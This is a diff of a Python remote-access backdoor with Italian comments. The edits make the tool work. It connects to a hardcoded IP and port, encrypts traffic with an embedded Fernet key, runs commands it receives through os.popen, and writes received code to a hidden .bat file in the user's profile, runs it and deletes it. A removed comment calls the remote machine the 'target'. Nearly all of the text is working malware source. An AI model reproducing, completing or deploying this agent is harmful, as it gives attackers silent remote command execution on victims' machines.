@@ -4,38 +4,40 @@ import zlib
 import socket
 from cryptography.fernet import Fernet
 
-#classe che gestisce il socket
 class Connection:
-    def __init__(self, code, command):
+
+
+    def __init__(self):
         self.sock = None
-        self.conn = None
         self.stat = False
-        self.ip = ""
-        self.port = 0
-        self.criptokey = b'Msi9jORIhlimMDIg2zlTaKrUIuU0LIBRJfVdww7QDJ4='
-        self.code = code
-        self.command = command
-
-    # comandi della connessione
+        self.ip = "192.168.42.32"
+        self.port = 10000
+        self.criptokey = Fernet(b'PwgEU6_d09vEPRrFpLgtnUf_ixxUxThA94Ma31823iI=')
 
 
+
+
+
+    def returnself(self):
+        return self
 
     def INIT_CONN(self):
         try:
-            self.sock = socket.socket(socket.AF_INET, socket.IPPROTO_TCP)
-            self.conn = self.sock.connect((self.ip, self.port))
+            self.sock = socket.socket()
+            self.sock.connect((self.ip, self.port))
             return True
         except:
             return False
 
     def CLOSE_CONN(self):
         try:
-            self.conn.close()
+            self.sock.close()
             return True
         except:
             return False
 
-    # ritorno informazioni utili
+
+
 
 
 
@@ -57,8 +59,10 @@ class Connection:
         except:
             return False
 
-# classe che gestisce la comunicazione al traghet
-class Operation(Connection):
+
+
+
+
     def SEND(self, data):
         try:
             data = data.encode()
@@ -66,51 +70,49 @@ class Operation(Connection):
             pass
         try:
             crc32 = zlib.crc32(data).to_bytes(6, 'big')
-            data = Fernet(self.criptokey).encrypt(data)
+            data = self.criptokey.encrypt(data)
             packet = data + b'@' + crc32
-            self.conn.send(packet)
+            self.sock.send(packet)
             return True
         except:
             return False
 
     def RECV(self):
         try:
-            data = self.conn.recv(4080)
-            data = str(data).split("@")
+            data = self.sock.recv(4080)
+            data = data.split(b'@')
             crc32 = data[-1]
             data.pop(-1)
-            payload = ""
+            payload = b''
             for index in data:
-                payload = payload.append(index + "")
+                payload = payload + index + b'@'
+            payload = payload.decode()
+            payload = list(payload)
             payload.pop(-1)
+            payload = "".join(payload)
             payload = payload.encode()
-            payload = Fernet(self.criptokey).decrypt(payload)
+            payload = self.criptokey.decrypt(payload)
             if zlib.crc32(payload).to_bytes(6, 'big') != crc32:
                 return False
             else:
-                return True
+                return payload
         except:
             return False
+class Comand():
 
-# classe che gestisce l'esecuzione di comando remoto
-class Comands():
-    def __init__(self, command, code):
-        self.command = command
-        self.code = code
-
-    def EX_COMMAND(self):
+    def EX_COMMAND(self, command):
         try:
-            output = os.popen(self.command).read()
+            output = os.popen(command).read()
             return output
         except:
             return False
 
-    def EX_SCRIPT(self):
+    def EX_SCRIPT(self, code):
         try:
             output = os.popen("whoami").read()
             user = output.split("/")[-1]
             script = open("C:\\Users\\" + user + "\\code.bat", "w+")
-            script.write(self.code)
+            script.write(code)
             script.close()
             output_script = os.popen("C:\\Users\\" + user + "\\code.bat").read()
             os.remove("C:\\Users\\" + user + "\\code.bat")
